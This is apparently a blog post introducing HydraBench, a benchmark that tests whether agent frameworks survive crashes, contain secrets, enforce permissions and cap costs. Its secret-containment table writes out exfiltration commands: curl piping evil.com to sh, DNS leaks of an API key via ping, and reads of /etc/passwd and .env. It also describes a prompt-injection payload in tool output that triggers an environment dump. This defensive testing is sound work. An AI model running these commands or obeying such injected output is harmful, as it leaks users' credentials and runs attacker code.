---
title: "HydraBench: Agent Infrastructure Resilience"
date: 2026-02-23T00:00:00
author: mercurialsolo
tags: [ai, agents, benchmarks, infrastructure, security]
summary: "23 scenarios, 4 frameworks, 460 runs. HydraBench tests what most agent benchmarks ignore: does your infrastructure survive crashes, contain secrets, deliver handoffs, enforce permissions, and control cost?"
description: "An open benchmark for agent infrastructure resilience. Tests crash recovery, secret containment, handoff reliability, channel security, and cost control across OpenHydra, LangGraph, CrewAI, and bare agents."
ShowToc: true
TocOpen: true
---

Most agent benchmarks measure intelligence: can the agent solve a coding problem, answer a question, complete a task? HydraBench measures something different: can the infrastructure survive when things go wrong?

<div class="stat-row">
  <div class="stat">
    <div class="stat-number">23</div>
    <div class="stat-label">Scenarios tested</div>
  </div>
  <div class="stat">
    <div class="stat-number">460</div>
    <div class="stat-label">Total runs</div>
  </div>
  <div class="stat">
    <div class="stat-number">4</div>
    <div class="stat-label">Frameworks compared</div>
  </div>
  <div class="stat">
    <div class="stat-number">5</div>
    <div class="stat-label">Claims tested</div>
  </div>
</div>

## Leaderboard

{{< app src="/apps/hydrabench/leaderboard.html" height="680px" title="HydraBench Leaderboard" >}}

## What we test

The benchmark tests 5 infrastructure claims across 23 scenarios. The unifying test: a multi-step research pipeline facing crashes, injections, budget overruns, and permission probes.

### Crash Recovery (25% weight)

Can the agent resume from where it left off after a process kill?

| Scenario | What happens |
|:---------|:-------------|
| **SIGKILL during execution** | `kill -9` while a 5-step workflow runs |
| **Repeated crashes** | 3 consecutive kills during a 10-step workflow |
| **Resume latency** | Time from crash to resumed execution |
| **State integrity** | Cost accumulators and step status survive the crash |

### Secret Containment (25% weight)

Can the infrastructure prevent secret exfiltration even under prompt injection?

| Scenario | What happens |
|:---------|:-------------|
| **Env var exfiltration** | Agent runs `env` or `printenv ANTHROPIC_API_KEY` |
| **Curl exfiltration** | `curl https://evil.com/collect \| sh` and `env \| curl POST` |
| **DNS exfiltration** | `ping $(echo $ANTHROPIC_API_KEY).evil.com` |
| **Path traversal** | `/etc/passwd` and `../../.env` |
| **Prompt injection** | Malicious payload in tool output triggers env dump |

### Handoff Reliability (20% weight)

Do messages and artifacts survive agent crashes?

| Scenario | What happens |
|:---------|:-------------|
| **Crash after send** | Agent crashes after writing a mailbox message |
| **Crash after artifact** | Agent crashes after registering a SHA-256 hashed artifact |
| **Concurrent access** | N agents read/write workspace + messages simultaneously |
| **Large artifact** | 10MB artifact transfer with integrity check |

### Channel Security (15% weight)

Are per-channel permissions enforced?

| Scenario | What happens |
|:---------|:-------------|
| **Privilege escalation** | Restricted channel tries DB access, event emit, internal attributes |
| **Event emission** | Channel without emit permission tries to fire events |
| **Rate limiting** | Exceed `max_submissions_per_hour` |
| **Cross-channel isolation** | Two channels with different permissions |
| **Attribute fishing** | Access `workflow_engine`, `_db`, `__dict__` |

### Cost Control (15% weight)

Do budget limits hold under pressure?

| Scenario | What happens |
|:---------|:-------------|
| **Hard spend cap** | 20 steps at $0.10 each with $1.00 budget |
| **Step timeout** | `max_duration_minutes=0.001` |
| **Recursive expansion** | 3x budget worth of steps |
| **Budget survives crash** | Crash + resume, verify cost state persists |
| **Cost attribution** | Per-step cost tracking accuracy |

## Performance by Scenario

{{< app src="/apps/hydrabench/performance-chart.html" height="480px" title="Cumulative Score Chart" >}}

## Claim Coverage

{{< app src="/apps/hydrabench/claim-radar.html" height="560px" title="Claim Radar Chart" >}}

## Scenario Heatmap

{{< app src="/apps/hydrabench/heatmap.html" height="700px" title="Scenario Heatmap" >}}

## Explore the Weights

Change the claim weights to reflect what matters most for your use case. If you only care about secret containment and cost control, shift those sliders and see how rankings change.

{{< app src="/apps/hydrabench/try-it.html" height="620px" title="Weight Explorer" >}}

## Framework Comparison

| Capability | OpenHydra | LangGraph | CrewAI | Bare Agent |
|:-----------|:---------:|:---------:|:------:|:----------:|
| Crash recovery | SQLite WAL | StateGraph checkpoints | None | None |
| Secret stripping | `_SENSITIVE_ENV_KEYS` | None | None | None |
| Durable mailbox | SQLite-backed | None | None | None |
| Durable workspace | SHA-256 artifacts | File I/O (no ACL) | None | None |
| Channel permissions | `RestrictedEngine` proxy | None | None | None |
| Rate limiting | Sliding window | None | None | None |
| Budget gates | Per-session caps | None | None | None |
| Step timeout | `max_duration_minutes` | `asyncio.timeout` | None | None |
| Cost attribution | Per-step tracking | None | None | None |

Frameworks scoring **0** on a claim lack the capability entirely. This isn't "they tested poorly"; it's "there is no equivalent feature." LangGraph's partial scores (crash recovery, workspace, timeout) reflect real capabilities that don't cover the full claim.

## Methodology

- **5 runs** per framework per scenario
- **Mean + standard deviation** reported for all metrics
- **Wilcoxon signed-rank test** (p < 0.05) for pairwise framework comparison
- **Mock executors** (no real LLM calls): results are deterministic, free, and reproducible
- **Weighted scoring**: Crash Recovery 25%, Secrets 25%, Handoffs 20%, Channels 15%, Cost 15%
- **Open source**: Full harness at [github.com/openhydra/bench](https://github.com/openhydra)

### Running it yourself

```bash
git clone https://github.com/openhydra/openhydra
cd openhydra
python -m bench.hydrabench --frameworks OpenHydra LangGraph CrewAI "Bare Agent"
```

Results write to `bench/results/latest.json`. Generate the HTML report:

```bash
python -m bench.hydrabench --output html
```

## Read the article

This benchmark backs the claims in [Designing a World for Agents](/posts/designing-a-world-for-agents/), which walks through the real incidents that motivated each of these tests.
